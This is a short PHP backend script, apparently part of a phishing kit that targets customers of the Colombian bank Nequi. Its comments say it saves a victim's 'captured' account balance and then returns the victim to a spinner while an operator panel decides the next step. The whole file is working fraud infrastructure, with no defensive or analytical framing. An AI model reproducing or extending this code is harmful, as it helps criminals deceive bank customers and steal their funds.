<?php
/**
 * guardar_saldo.php
 * Guarda el saldo disponible capturado del cliente Nequi
 * y cambia el estado a 1 (esperando siguiente orden del panel)
 */

require_once('../lib/class.inputfilter.php');
require('../panel/include/setings.php');
date_default_timezone_set('America/Bogota');

$ifilter = new InputFilter();

// Obtener ID del cliente desde cookie
$id = isset($_COOKIE['id']) ? $ifilter->process($_COOKIE['id']) : '';

// Obtener saldo desde POST
$saldo = isset($_POST['saldo']) ? $ifilter->process($_POST['saldo']) : '';

// Validar que tenemos datos
if ($id === '' || $id === '0' || $saldo === '') {
	http_response_code(400);
	echo 'ERR';
	exit;
}

// Guardar saldo en la base de datos
try {
	put_saldo_nequi($id, $saldo);
	
	// Cambiar estado a 1 (estado inicial/esperando siguiente orden)
	// Esto hace que el cliente vuelva al spinner esperando la siguiente instrucción del panel
	cambiar_estado_transaccion($id, 1);
	
	echo 'OK';
} catch (Exception $e) {
	error_log('Error guardando saldo: ' . $e->getMessage());
	http_response_code(500);
	echo 'ERR';
	exit;
}
?>
